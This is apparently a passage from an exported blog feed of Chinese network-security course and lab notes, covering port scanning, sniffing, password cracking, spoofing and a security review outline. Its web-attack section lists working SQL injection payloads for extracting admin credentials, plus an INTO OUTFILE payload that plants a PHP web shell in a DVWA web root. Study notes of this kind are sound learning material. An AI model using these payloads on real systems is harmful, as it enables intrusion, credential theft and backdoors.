connect()，<br>2.SYN半打开，（应答包含SYN和ACK，端口打开）<br>3.FIN秘密（应答RST端口关闭，否则丢包端口开启)变种 X-mas和Null  （打开和关闭标记）适用Unix主机<br>5.UDP ICMP （Windows适用 ）    </p><p>命令总结：<br>-sT：扫描TCP数据包以建立的连接connect()</p><p>-sS：扫描TCP数据包带有SYN数据的标记（发送SYN,收到SYN|ACK，发送RST代替ACK，连接终止，三次握手未实现。）</p><p>-sP：以ping方式进行扫描</p><p>-sU：以UDP数据包格式进行扫描</p><p>-sF,-sX,-sN：以Fin,Xmas,Null方式扫描      </p><h1 id="Sniffer嗅探使用"><a href="#Sniffer嗅探使用" class="headerlink" title="Sniffer嗅探使用"></a>Sniffer嗅探使用</h1><p>捕获局域网之间的信息传输。<br>例如捕获FTP包和HTTP包。<br>Matrix — Capture— Decode.</p><h1 id="Linux路由信息探测"><a href="#Linux路由信息探测" class="headerlink" title="Linux路由信息探测"></a>Linux路由信息探测</h1><p>info traceroute查看路由信息<br>mii-tool查看当前网络<br>ifconfig eth0 ip netmask 子网掩码 up<br>route add default gw 网关<br>ifconfig查看配置信息<br>traceroute 域名</p><h1 id="域名信息探测"><a href="#域名信息探测" class="headerlink" title="域名信息探测"></a>域名信息探测</h1><p>nslookup； 查询DNS记录；查看域名解析是否正常；<br>set type=any 所有类型记录；</p><p>10.路由信息探测</p><h1 id="主机信息探测实验"><a href="#主机信息探测实验" class="headerlink" title="主机信息探测实验"></a>主机信息探测实验</h1><p>X-scan<br>MBSA</p><p>12.交换式网络嗅探<br>集线器共享式网络<br>交换机交换式网络</p><h1 id="操作系统指纹探测"><a href="#操作系统指纹探测" class="headerlink" title="操作系统指纹探测"></a>操作系统指纹探测</h1><p>ping TTL=128Windows TTL=235左右 Unix家族</p><h1 id="指针"><a href="#指针" class="headerlink" title="指针"></a>指针</h1><p>EIP 指令指针<br>EBP 栈底指针<br>ESP 栈顶指针</p><h1 id="scanport"><a href="#scanport" class="headerlink" title="scanport"></a>scanport</h1><p>扫描端口</p><h1 id="Stinger病毒查杀"><a href="#Stinger病毒查杀" class="headerlink" title="Stinger病毒查杀"></a>Stinger病毒查杀</h1><h1 id="Jsky扫描网站漏洞"><a href="#Jsky扫描网站漏洞" class="headerlink" title="Jsky扫描网站漏洞"></a>Jsky扫描网站漏洞</h1><h1 id="IISwrite漏洞利用"><a href="#IISwrite漏洞利用" class="headerlink" title="IISwrite漏洞利用"></a>IISwrite漏洞利用</h1><p>WebDAV扩展的HTTP请求实现的文件存储服务，用类似HTTP请求方式上传下载同步文件。应用程序可对Web Server直接读写。</p><p>IIS scanner可利用漏洞上传文件留后门</p><h1 id="APPSCAN扫描WEB漏洞"><a href="#APPSCAN扫描WEB漏洞" class="headerlink" title="APPSCAN扫描WEB漏洞"></a>APPSCAN扫描WEB漏洞</h1><h1 id="owasp-zap扫描网站漏洞"><a href="#owasp-zap扫描网站漏洞" class="headerlink" title="owasp zap扫描网站漏洞"></a>owasp zap扫描网站漏洞</h1><p>可扫描端口，扫描漏洞，爬取站点。</p><h1 id="WebCruiser扫描网站漏洞"><a href="#WebCruiser扫描网站漏洞" class="headerlink" title="WebCruiser扫描网站漏洞"></a>WebCruiser扫描网站漏洞</h1><h1 id="WSCAN扫描网站后台"><a href="#WSCAN扫描网站后台" class="headerlink" title="WSCAN扫描网站后台"></a>WSCAN扫描网站后台</h1><p>（啊D和名小子）</p><h1 id="路由信息探测"><a href="#路由信息探测" class="headerlink" title="路由信息探测"></a>路由信息探测</h1><p>ping -r <a href="http://www.baidu.com记录中间路由（类型为8数据报，每转发一次，IP地址写入一次，-1）" target="_blank" rel="noopener">www.baidu.com记录中间路由（类型为8数据报，每转发一次，IP地址写入一次，-1）</a><br>UDP协议路由探测：路由转发TTL-1，为0时ICMP超时确定路由<br>ICMP ECHO Request路由探测:发送端TTL+1，中转路由TTL-1</p><h1 id="安全漏洞探测"><a href="#安全漏洞探测" class="headerlink" title="安全漏洞探测"></a>安全漏洞探测</h1><p>Fluxay漏洞扫描<br>Nessus漏洞扫描</p><hr><h1 id="Linux系统密码破解"><a href="#Linux系统密码破解" class="headerlink" title="Linux系统密码破解"></a>Linux系统密码破解</h1><p>/etc/passwd文件 有UID信息，为0具有root权限<br>加密口令在 /etc/shadow文件 root权限<br>/etc/group,GID被映射到用户分组名称</p><h1 id="Linux密码修改"><a href="#Linux密码修改" class="headerlink" title="Linux密码修改"></a>Linux密码修改</h1><p>Centos<br>任意键进入grub引导–Centos(e编辑)–kernel(e)—输入single保存进入单用户—菜单按b进入—cat /etc/passwd查看账户信息—最后一个为常用登陆用户名。 passwd root修改密码—-useradd Jason;password Jason(新建用户)—-reboot</p><h1 id="Windows密码破解"><a href="#Windows密码破解" class="headerlink" title="Windows密码破解"></a>Windows密码破解</h1><p>NTLM算法</p><p>LM算法</p><p>Windows密码文件SAM文件存放c:\Windows\System32\config<br>无法复制破解，可嗅探Hash值，利用pwdump,SamInside工具进行爆破。包括暴力破解、字典攻击、彩虹表攻击，暴力破解。</p><h1 id="Md5破解"><a href="#Md5破解" class="headerlink" title="Md5破解"></a>Md5破解</h1><p>Md5Crack或在线破解</p><h1 id="压缩文件解密"><a href="#压缩文件解密" class="headerlink" title="压缩文件解密"></a>压缩文件解密</h1><p>AES算法</p><p>加密过程<br>（1）：先把源文件压缩，压成一段数据段。<br>（2）：再将压缩完的数据段加密。<br>加密流程<br>（1）获取密钥<br>（2）以Key和initVector来加密压缩数据：</p><p>解密的过程是解密后的数据块进行解压缩，然后解成源文件，对该文件进行CRC校验，存在RAR文件中的源文件CRC校验码比较，相同则密码正确，不相同则密码错误。</p><p>解密工具:ARPR</p><h1 id="OFFICE文件密码破解"><a href="#OFFICE文件密码破解" class="headerlink" title="OFFICE文件密码破解"></a>OFFICE文件密码破解</h1><p>hash函数（单向不可逆）<br>RC4流加密算法，对称体制加密。<br>加密过程：产生一个salt,口令+salt计算hash;</p><p>aoprsetup工具进行破解；<br>SingK可生成字典</p><h1 id="Access密码破解"><a href="#Access密码破解" class="headerlink" title="Access密码破解"></a>Access密码破解</h1><p>1.soft_vap<br>2.Cain<br>3.aopr</p><h1 id="Windows修改密码"><a href="#Windows修改密码" class="headerlink" title="Windows修改密码"></a>Windows修改密码</h1><p>SAM存储登录名及口令信息<br>L0pthCrack可破解系统用户密码<br>Aoxppr.exe可破解word等密码</p><h1 id="Windows密码破解-1"><a href="#Windows密码破解-1" class="headerlink" title="Windows密码破解"></a>Windows密码破解</h1><p>Pwdump7破解SAM信息<br>SAMInside进行解密获取密码</p><hr><p><strong>欺骗技术</strong></p><h1 id="ARP欺骗"><a href="#ARP欺骗" class="headerlink" title="ARP欺骗"></a>ARP欺骗</h1><p>1.中间人攻击<br>A攻击者 S源主机 D目的主机<br>D的IP与A的MAC/S的IP与A的MAC，形成中继<br>2.拒绝服务<br>ARP表中MAC地址改为不存在的 ，先修改MAC地址，无服务，然后克隆目标主机IP与MAC地址。</p><hr><h1 id="IP欺骗："><a href="#IP欺骗：" class="headerlink" title="IP欺骗："></a>IP欺骗：</h1><p>1.随意伪造IP，主要DDOS，<br>2.伪造被攻击者信任IP冒充；</p><p>IPSpoof:TCP及IP欺骗（Mendax,Hunt,Dsniff,ISNPrint）</p><h1 id="MAC欺骗"><a href="#MAC欺骗" class="headerlink" title="MAC欺骗"></a>MAC欺骗</h1><p>IP-MAC-PORT 利用MAC和PORT对应关系</p><p>MacMakeUp伪造源MAC地址的MAC欺骗。</p><h1 id="ARP-DNS欺骗"><a href="#ARP-DNS欺骗" class="headerlink" title="ARP_DNS欺骗"></a>ARP_DNS欺骗</h1><p>ARP是局域网，DNS是internet攻击；<br>ARP:路由器ARP表欺骗，内网PC网关欺骗。</p><h2 id="未完"><a href="#未完" class="headerlink" title="未完"></a>未完</h2><h1 id="Web攻击技术"><a href="#Web攻击技术" class="headerlink" title="Web攻击技术"></a>Web攻击技术</h1><p>SQL运算符优先级<br>:=</p><p>||, OR, XOR</p><p>&amp;&amp;, AND</p><p>NOT</p><p>BETWEEN, CASE, WHEN, THEN, ELSE</p><p>=, &lt;=&gt;, &gt;=, &gt;, &lt;=, &lt;, &lt;&gt;, !=, IS, LIKE, REGEXP, IN</p><p>|</p><p>&amp;</p><p>&lt;, &gt;&gt;</p><p>-, +</p><p>*, /, DIV, %, MOD</p><p>^</p><ul><li>(一元减号), ~ (一元比特反转)</li></ul><p>!</p><p>BINARY, COLLATE</p><h1 id="Mysql注释"><a href="#Mysql注释" class="headerlink" title="Mysql注释"></a>Mysql注释</h1><p>–/# 为注释</p><p>ascii(substr(string,start,length))&gt;113;(r为113)</p><h1 id="XSS漏洞"><a href="#XSS漏洞" class="headerlink" title="XSS漏洞"></a>XSS漏洞</h1><p>1.本地利用2.反射3.存储<br>trim（）移除字串字头或字尾，删除字符串首尾空白；<br>stripslashes()函数由addslashes()函数添加的反斜杠；<br>mysql_real_escape_string() 函数转义 SQL 语句中使用的字符串中的特殊字符；<br>mysql_query() 函数执行一条 MySQL 查询。</p><h1 id="Uploads"><a href="#Uploads" class="headerlink" title="Uploads"></a>Uploads</h1><p>int strrpos ( string $haystack , string $needle [, int $offset = 0 ] )<br> 返回字符串 haystack 中 needle 最后一次出现的数字位置</p><p> substr ( string $string , int $start [, int $length ] )<br>返回字符串 string 由 start 和 length 参数指定的子字符串。</p><h1 id="远程命令"><a href="#远程命令" class="headerlink" title="远程命令"></a>远程命令</h1><p>Telnet（选项）（参数）  Linux远程登陆主机</p><p>mstsc Windows远程连接</p><h1 id="盲注流程"><a href="#盲注流程" class="headerlink" title="盲注流程"></a>盲注流程</h1><p>and 1=1 and 1=2<br>‘ and ‘1’=’1’ and ‘1’=’2<br>%’ and 1=1 and ‘%’=’%  / %’ and 1=2 and ‘%’=’%</p><p>IIS报错使用<br>and user&gt;0 判断ACCESS或MYSQL</p><p>不报错使用</p><pre><code>and (select count(*) from msysobjects)&gt;0 （返回权限不足access数据库）and (select count(*) from sysobjects)&gt;0 （返回正常则为MSSQL数据库）and db_name（）&gt;0 (返回数据库名)and 0&lt;&gt;(select @@version)-- (判断版本信息)and db_name（）&gt;0 （返回数据库名）</code></pre><h2 id="ACCESS注入"><a href="#ACCESS注入" class="headerlink" title="ACCESS注入"></a>ACCESS注入</h2><p>1.猜表 2.猜字段 3.猜用户名和密码长度</p><pre><code>and exists (select * from [admin])and (Select Count(*) from Admin)&gt;0and (Select username from Admin)&gt;0    and exists(select username from admin)&gt;0and (select top 1 len(username) from Admin)&gt;0and (select top 1 len(password) from Admin)&gt;0and (select top 1 asc(mid(username,1,1)) from admin)&gt;0...</code></pre><p>猜用户 1，换成2….继续。</p><h2 id="SQLSERVER注入"><a href="#SQLSERVER注入" class="headerlink" title="SQLSERVER注入"></a>SQLSERVER注入</h2><p>每一个数据库都会有用户表和系统表，在系统表sysobjects中。<br>name （数据表的名字），xtype（数据表的类型 u为用户表），id（ 数据表的对象标志）。</p><h3 id="猜表"><a href="#猜表" class="headerlink" title="猜表"></a>猜表</h3><pre><code>and (select top 1 name from sysobjects where xtype=&apos;u&apos;)&gt;0 (得到第一个表名:比如user)and (select top 1 name from sysobjects where xtype=&apos;u&apos; and name not in (&apos;user&apos;))&gt;0 </code></pre><h3 id="猜列"><a href="#猜列" class="headerlink" title="猜列"></a>猜列</h3><pre><code>and (select top 1 col_name(object_id(&apos;admin&apos;),1) from sysobjects)&gt;0</code></pre><h3 id="猜字段"><a href="#猜字段" class="headerlink" title="猜字段"></a>猜字段</h3><pre><code>and (select top 1 username from [admin])&gt;0 【直接得到用户名】and (select top 1 password from [admin])&gt;0 【直接得到密码】and 1=(select count(*) from admin where len(username)&gt;0)select name,password,id from user union select user,pwd,uid from 表名and 1=1 union select 1,2,3,4,5... from 表名</code></pre><h4 id="ASCII逐字解码"><a href="#ASCII逐字解码" class="headerlink" title="ASCII逐字解码"></a>ASCII逐字解码</h4><p>1.猜列长度</p><pre><code>and (select top 1 len(列名)from 表名)&gt;Nselect top 1 len(列名) from 表名 where 列名 not in (select top 1 列名 from 表名)</code></pre><p>2.猜用户和密码</p><pre><code>and (select top 1 asc(mid(字段,1,1)) from 数据库名)&gt;ASCII码</code></pre><p>可用 betweent…..and….</p><p>负数加abs()</p><p>3.应用</p><pre><code>and (select count(*) from admin)&lt;&gt;0        //表and (select count(列名) from 表名)&lt;&gt;0    //列and (select count(*) from 表名)&gt;1,2.. //用户个数and (select len(列名) from 表名)&gt;=1、&gt;=2、&gt;=3、&gt;=4 //用户长度and (select count(*)from 表名 where (asc(mid(列名,1,1))) between 30 and 130)&lt;&gt;0 //用户名列名换password猜密码</code></pre><p>4.类型详解<br>user,db_name()&gt;0  判断SQL_SERVER,<br>ACCESS系统表：msysobjects  SQL系统表： sysobjects</p><p>5.联合查询</p><pre><code>And 1=2 union select 1,2,3,4 数字有时换null;Order by 10#And 1=2 union select 1,2,3,4,username,5,6,7 from admin    PHP注入换And 1=2+union+select+1,2,3,4,concat(username),5,6,7+from+admin换And 1=2/**/union/**/select/**/1,2,3,4,concat(username),5,6,7/**/from/**/admin/* and+1=2+union+select+1,username,3,password,5,6,7,8,9,10+from+users+where+id=2 //取第二个管理员信息</code></pre><p>6.非联合查询</p><pre><code>and 1=(select count(*) from admin where len(username)=5)and (select top 1 asc(mid(username,1,1)) from Admin)&gt;0</code></pre><p>中文处理：<br>ACCESS 中文ascii负数取abs(),SQLServer 中文Unicode编码，用unicode(),nchar取中文字符</p><pre><code>and (select top 1 unicode(substring(usernmae,1,1)) from manage)&gt;1.....</code></pre><p>SQLSERVER注释 –<br>MYSQL 注释 #</p><h3 id="MYSQL应用"><a href="#MYSQL应用" class="headerlink" title="MYSQL应用"></a>MYSQL应用</h3><p>字符型注入<br>    1’ and (select count(*) from tablenames)&gt;0;#<br>    a’ or database() like ‘%k%’ ;#<br>    a’ union select table_schema,table_name from information_schema.tables where table_schema like ‘%dv%’<br>    a’ union selcect table_schema,table_name from information_schema.tables;# //table_schema数据库名，table_name 表名<br>union 默认会去掉重复记录值再合并成结果集，如果需要保留重复的记录值，请使用 union all</p><pre><code>&apos; union select &apos;&apos;,&apos;&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;&apos; into outfile &apos;D:\\Program Files\\Apache Software Foundation\\Apache2.2\\htdocs\\dvwa\\shell.php&apos;;#</code></pre><p>留后门</p><p>（magic_quotes_gpc=On时。提交的变量中所有的’ (单引号), “ (双引号), \ (反斜线)和空字符会自动转为含有反斜线的转义字符。）</p><h1 id="记录变量"><a href="#记录变量" class="headerlink" title="记录变量"></a>记录变量</h1><p>varchar(n):变长型字符数据类型<br>nvarchar(n):可变长度 Unicode 数据<br>char类型： 固定长度，</p><p>截取字符串：<br>mid(column_name,start,[,length]);<br>substring(string,start,length);<br>left(string,n）/n为长度</p><h1 id="DNS域名解析"><a href="#DNS域名解析" class="headerlink" title="DNS域名解析"></a>DNS域名解析</h1><p>53端口<br>C:\Windows\System32\Drivers\etc\hosts，<br>解析先查找本地HOSTS文件<br>清除缓存命令 ipconfig/flushdns</p><h1 id="DDOS攻击"><a href="#DDOS攻击" class="headerlink" title="DDOS攻击"></a>DDOS攻击</h1><h2 id="DOS"><a href="#DOS" class="headerlink" title="DOS"></a>DOS</h2><p>拒绝服务：<br>TearDrop、Land、Jolt、IGMP Nuker、Boink、Smurf、Bonk       </p><h2 id="DDOS"><a href="#DDOS" class="headerlink" title="DDOS"></a>DDOS</h2><p>DDOS 分布式拒绝服务，洪水式攻击：<br>SYN Flood、ACK Flood、UDP Flood、ICMP Flood、TCP Flood、  Connections Flood、Script Flood、Proxy Flood      </p><h2 id="SYN"><a href="#SYN" class="headerlink" title="SYN"></a>SYN</h2><p>SYNDemo工具</p><h2 id="UDP洪水攻击"><a href="#UDP洪水攻击" class="headerlink" title="UDP洪水攻击"></a>UDP洪水攻击</h2><p>udpflood工具</p><h2 id="ICMP"><a href="#ICMP" class="headerlink" title="ICMP"></a>ICMP</h2><p>狂怒之ping工具</p><h2 id=""><a href="#" class="headerlink" title=" "></a> </h2>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;Linux 快捷键：&lt;br&gt;终端:&lt;br&gt;复制命令：Ctrl + Shift + C  组合键    .    &lt;/p&gt;
&lt;p&gt;粘贴命令：Ctrl + Shift + V  组合键           &lt;/p&gt;
&lt;p&gt;控制台：&lt;br&gt;复制命令：Ctrl + Insert  
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>网络安全复习</title>
    <link href="http://yoursite.com/2018/11/05/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%8D%E4%B9%A0/"/>
    <id>http://yoursite.com/2018/11/05/网络安全复习/</id>
    <published>2018-11-04T16:00:00.000Z</published>
    <updated>2018-12-23T04:21:08.765Z</updated>
    
    <content type="html"><![CDATA[<h1 id="概论"><a href="#概论" class="headerlink" title="概论"></a>概论</h1><h2 id="安全主要威胁"><a href="#安全主要威胁" class="headerlink" title="安全主要威胁"></a>安全主要威胁</h2><ul><li>特洛伊木马</li><li>黑客攻击</li><li>内部、外部泄密</li><li>计算机病毒</li><li>信息丢失、篡改、销毁</li><li>内部、外部泄密</li><li>蠕虫</li><li>拒绝服务攻击</li><li>逻辑炸弹</li><li>后门、隐蔽通道</li></ul><h2 id="CIA三元组"><a href="#CIA三元组" class="headerlink" title="CIA三元组"></a>CIA三元组</h2><ul><li>机密性</li><li>完整性</li><li>可用性</li></ul><h2 id="网络攻击类型"><a href="#网络攻击类型" class="headerlink" title="网络攻击类型"></a>网络攻击类型</h2><h3 id="安全属性分5类"><a href="#安全属性分5类" class="headerlink" title="安全属性分5类:"></a>安全属性分5类:</h3><p>阻断、截取、篡改、伪造、重放攻击</p><h3 id="攻击方式"><a href="#攻击方式" class="headerlink" title="攻击方式:"></a>攻击方式:</h3><ul><li>主动:伪装、回答、修改报文、拒绝服务。</li><li>被动攻击:报文内容泄露、通信分析。</li></ul><h2 id="OSI安全体系："><a href="#OSI安全体系：" class="headerlink" title="OSI安全体系："></a>OSI安全体系：</h2><h3 id="5类安全服务"><a href="#5类安全服务" class="headerlink" title="5类安全服务:"></a>5类安全服务:</h3><p>机密性、完整性、访问控制、不可否认、鉴别；  </p><h3 id="8种安全机制："><a href="#8种安全机制：" class="headerlink" title="8种安全机制："></a>8种安全机制：</h3><p>访问控制、公证、路由控制、流量填充、身份认证交换、数字签名、信息完整性、加密   </p><hr><h1 id="第一章-攻击流程和渗透测试"><a href="#第一章-攻击流程和渗透测试" class="headerlink" title="第一章 攻击流程和渗透测试"></a>第一章 攻击流程和渗透测试</h1><h2 id="黑客攻击流程"><a href="#黑客攻击流程" class="headerlink" title="黑客攻击流程"></a>黑客攻击流程</h2><p><img src="https://i.imgur.com/Xmtwn9i.png" alt=""><br>踩点：确定目标地址范围、查询名字空间、收集信息<br>扫描：评估目标系统，识别监听业务<br>查点：识别目标系统上合法用户账户和保护力不够的共享资源<br>获取访问权：利用收集的足够数据，访问目标系统<br>提权：寻找系统完全控制<br>窃取信息:通过信息获取确定目标系统的入侵机制和途径<br>掩踪灭迹:擦除访问痕迹<br>创建后门：系统中留下后门和陷阱，为下次入侵创造条件<br>拒绝服务:无法取得特权，使用漏洞代码使目标系统瘫痪  </p><h2 id="搜索引擎技巧"><a href="#搜索引擎技巧" class="headerlink" title="搜索引擎技巧:"></a>搜索引擎技巧:</h2><ul><li>site: 具体网站  //site: cumt.edu.cn    </li><li>link:链接到URL网页 //link: cumt.edu.cn  </li><li>inurl:包含第一个关键词,其他在链接或网页文档 //inurl: cumt 计算机</li><li>allinurl:链接包含查询关键词  </li><li>allintitle&amp;intitle类似上   </li><li>related、cache、info等  //related:<a href="http://www.cumt.edu.com/index.html" target="_blank" rel="noopener">www.cumt.edu.com/index.html</a></li></ul><h2 id="渗透测试七个阶段："><a href="#渗透测试七个阶段：" class="headerlink" title="渗透测试七个阶段："></a>渗透测试七个阶段：</h2><ul><li>前期交互 </li><li>情报搜集</li><li>威胁建模 </li><li>漏洞分析</li><li>渗透攻击</li><li>后渗透攻击</li><li>报告</li></ul><p>分类：</p><ul><li><p>白盒测试（White-boxTesting，内部测试）：拥有组织机构的内部知识的情况下进行的渗透测试</p></li><li><p>灰盒测试（Gray-box Testing）</p></li><li><p>黑盒测试（Black-boxTesting，外部测试）：模拟一个对组织机构一无所知的攻击者所进行的渗透攻击<br><img src="https://i.imgur.com/c2bvuEQ.png" alt=""></p></li></ul><h2 id="踩点"><a href="#踩点" class="headerlink" title="踩点"></a>踩点</h2><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p><strong>确定目标地址范围、查询名字空间、收集信息</strong></p><h2 id="途径"><a href="#途径" class="headerlink" title="途径"></a>途径</h2><p>1.WHOIS查询：获得域名和IP地址注册信息<br>2.DNS查询：</p><ul><li>工具作用：</li></ul><p>nslookup(查询域名信息或诊断DNS服务器问题)、dig(域名解析)、fierce(暴力破解DNS)</p><ul><li>命令作用：</li></ul><p>host:主机名<->网际地址<br>traceroute:路由追踪</-></p><p>3.公开渠道获取信息<br>4.网络侦查   </p><h2 id="扫描"><a href="#扫描" class="headerlink" title="扫描"></a>扫描</h2><p>基本步骤：  </p><p>确定目标系统是否真实存在-&gt;确定目标系统上那些服务正在运行或监听-&gt;探查操作系统  </p><p>nmap:</p><pre><code>-sP：进行ping扫描-sn:  Ping Scan - disable port scan  #ping探测扫描主机， 不进行端口扫描 （测试过对方主机把icmp包都丢弃掉，依然能检测到对方开机状态）-sA （发送tcp的ack包进行探测，可以探测主机是否存活）-sS ：半开放扫描（非3次握手的tcp扫描）/*优点：Nmap发送SYN包到远程主机，但是它不会产生任何会话，目标主机几乎不会把连接记入系统日志。（防止对方判断为扫描攻击），扫描速度快，效率高，在工作中使用频率最高缺点：它需要root/administrator权限执行*/-sT：3次握手方式tcp的扫描 #效率低，速度慢，不需要root-sU：udp端口的扫描 #如果返回ICMP不可达的错误消息，说明端口是关闭的，如果得到正确的适当的回应，说明端口是开放的.udp端口扫描速度比较慢-sF：也是tcp的扫描一种，发送一个FIN标志的数据包-sX：圣诞树扫描-sN：空(NULL)扫描-sW：窗口扫描-sV：版本检测</code></pre><p>Nessus/OpenVAS:<br>主机扫描/端口扫描/OS识别/漏洞扫描</p><h2 id="查点"><a href="#查点" class="headerlink" title="查点"></a>查点</h2><h2 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h2><p>识别目标系统上合法用户账户和保护力不够的共享资源。</p><h2 id="造成原因"><a href="#造成原因" class="headerlink" title="造成原因"></a>造成原因</h2><ul><li><p>用户账号名（用于随后的口令猜测攻击）</p></li><li><p>错误配置的共享资源（如不安全的文件共享）</p></li><li><p>具有已知安全性漏洞的旧版本软件（如存在远程缓冲区溢出的web服务器）</p><h3 id="旗标抓取"><a href="#旗标抓取" class="headerlink" title="旗标抓取"></a>旗标抓取</h3><p>telnet<br><code>telnet www.cumt.edu.cn 80</code><br>netcat<br><code>nc -v 163.com 80</code></p></li></ul><h1 id="第二章网络嗅探"><a href="#第二章网络嗅探" class="headerlink" title="第二章网络嗅探"></a>第二章网络嗅探</h1><ul><li>共享式局域网</li><li>交换式局域网（溢出攻击、ARP欺骗）</li></ul><p>嗅探软件工作机制:</p><ul><li>驱动程序支持<br>将网卡设置成混杂模式，捕获数据包并提交上层协议<br>软件处理</li><li>分组捕获过滤机制：<br>网卡上传的数据帧有两个去处：正常的协议栈或分组<br>捕获过滤模块，对于非本地的数据包，前者会丢弃，后<br>者则根据上层应用要求来决定是否丢弃</li></ul><p>网卡工作模式：</p><ul><li>广播:广播信息</li><li>组播:组播数据</li><li>单播：目的地址匹配本机MAC地址数据帧</li><li>混杂：接收一切数据帧</li></ul><p>网络监听的防御：<br>被动防御：</p><ul><li>采用安全的网络拓扑结构和数据加密技术（网络分段、VLAN、）</li><li>数据通道加密(SSH、SSL、VPN)</li><li>数据内容加密</li></ul><p>交换网络下防监听：</p><pre><code>1 不要把网络安全信任关系建立在单一的IP或MAC基础上，理想的关系应该建立在IP-MAC的对应关系上2 使用静态ARP或者IP-MAC对照表代替动态的ARP或者IP-MAC对应表——禁止自动更新，使用手动更新3 定期检查ARP请求：使用ARP监视工具如ARPWatch等监视并探测arp欺骗4 制定良好的安全管理策略，加强用户安全意识</code></pre><p>Winpcap基于混杂模式进行嗅探<br><img src="https://i.imgur.com/yHdzyKa.png" alt=""></p><h1 id="第三章口令破解与防御"><a href="#第三章口令破解与防御" class="headerlink" title="第三章口令破解与防御"></a>第三章口令破解与防御</h1><p>Windows:<br><strong>安全账户管理器SAM机制（C:\Windows\system32\config\SAM)</strong><br>1.SAM:<br>包含本地系统所有用户名和口令的Hash值 </p><p>2.口令Hash:<br>LM和NTLMv2</p><p>LM:</p><pre><code>1.将口令全部转换为大写2.添加NULL字符，直到口令长度等于14字符，并转化为二进制字符串3.将新口令拆分为两组7位打的字符串4.分别经过str_to_key()函数处理创建两个DES加密密钥，并未每一组添加奇偶校验位，创建出64位的密钥5.使用每个DES密钥加密一个预定义的魔术字符串，获得两个8字节的密文值6.密文值链接成16字节的值，即最终获得的LM哈希。</code></pre><p>缺陷：</p><pre><code>1.des算法密钥太短2.69^7种可能，可以暴力破解3.如果密码长度&lt;=7,则第二部分hash为固定值，因此很容易确定密码的长度范围。4.Hash值在通过网络发送到服务器的时候，没有进行salting操作，容易遭受中间人攻击和重放攻击。</code></pre><p>3.安全标示RID：在账号创建是被创建，账号删除时，RID也同时删除，及时用户名相同，每次创建时获得的RID也不同。</p><p>4.hash密码格式:<br>用户名:RID:LM-HASH值：NT-HASH值   </p><p><strong>Linux</strong>:<br>修改密码:passwd<br><strong>/etc/passwd：用户名及基本信息</strong><br><strong>/etc/shadow： 影子密码文件,加密过的密码及失效时间 </strong><br>/etc/group:所有组<br>/etc/gshadow:所有组的群组影子密码文件</p><ul><li>过去:单向函数crypt(),基于DES算法</li><li>现在：crypt16() 口令+salt=不同加密口令（md5)     MCF(模块化加密模式)</li></ul><h2 id="命令功能及使用"><a href="#命令功能及使用" class="headerlink" title="命令功能及使用"></a>命令功能及使用</h2><ul><li>chmod:修改文件权限位  </li><li>passwd/gpasswd 密码修改  </li><li>usermod/groupmod 用户账户修改   </li></ul><h1 id="第四章欺骗技术与防御"><a href="#第四章欺骗技术与防御" class="headerlink" title="第四章欺骗技术与防御"></a>第四章欺骗技术与防御</h1><h2 id="0x01-IP欺骗"><a href="#0x01-IP欺骗" class="headerlink" title="0x01 IP欺骗"></a>0x01 IP欺骗</h2><h3 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h3><p>IP协议:非面向连接，连接依靠双方IP地址</p><p>IP欺骗的方式：<br>简单的IP地址更改:简单IP地址更改，<strong>盲目飞行攻击和单向攻击</strong><br>源路由攻击：<strong>确保目标主机返回的数据流</strong>，宽松源站LSR/严格源站SRS<br>TCP会话劫持：接管现存动态会话的过程。即攻击者替代原来的合法用户，同时监视并掌握会话内容（<strong>被冒充者会被迫下线</strong>）</p><p>序列号机制：<br>序列号用来说明接收方下一步将要接收的数据包的顺序,猜测 一个属于发送方的序列号和另一个属于接收方的应答号。</p><p>劫持过程</p><ul><li>发现攻击目标</li><li>确认动态会话</li><li><strong>猜测序列号</strong>(会话劫持关键)</li><li>使客户主机下线（DOS）</li><li>接管会话<h3 id="后果"><a href="#后果" class="headerlink" title="后果"></a>后果</h3></li><li>就其实现原理而言，任何使用Internet进行通信 的主机都有可能受到这种攻击</li><li>产生了简单适用的会话劫持攻击软件，技术门槛的 降低导致了很多“少年攻击者”的诞生.<h3 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h3>1.防范基本的IP欺骗</li><li>入口过滤：不允许外网的数据包使用单位内部地址作为源地址</li><li>出口过滤：内网到内网主机的流量不允许流出</li></ul><p>2.防范源路由欺骗<br>设置路由器禁用源路由</p><p>3.防范会话劫持<br>加密、安全协议(SSH而非Telnet)、对信息进行限制保护</p><h2 id="ARP欺骗"><a href="#ARP欺骗" class="headerlink" title="ARP欺骗"></a>ARP欺骗</h2><h3 id="攻击-1"><a href="#攻击-1" class="headerlink" title="攻击"></a>攻击</h3><ol><li>工作原理: IP地址=&gt;MAC地址（广播）  </li><li>ARP协议有ARP请求包和ARP应答包</li><li>主机和网关都有ARP缓存表，就是IP-MAC地址对，分静态和动态。(arp -a可进行查看)</li><li>ARP欺骗原理（中间人）：</li></ol><p><img src="https://i.imgur.com/22ig6XD.png" alt=""></p><h3 id="后果-1"><a href="#后果-1" class="headerlink" title="后果"></a>后果</h3><ul><li>导致同网段的其他用户无法正常上网.</li><li>嗅探交换式局域网内的所有数据包，从而获取敏感信息.</li><li>对信息进行篡改，修改重要信息，进而控制受害者会话.</li></ul><h3 id="防御-1"><a href="#防御-1" class="headerlink" title="防御"></a>防御</h3><ul><li>MAC地址绑定</li><li>静态ARP缓存</li><li>ARP服务器</li><li>ARP欺骗防护软件(ARP防火墙)</li><li>隔离进行ARP欺骗的主机<br>arp记录设置成静态:<code>arp -s ip mac</code><h1 id="第五章Web欺骗与防御"><a href="#第五章Web欺骗与防御" class="headerlink" title="第五章Web欺骗与防御"></a>第五章Web欺骗与防御</h1></li></ul><h2 id="SQL注入攻击原理"><a href="#SQL注入攻击原理" class="headerlink" 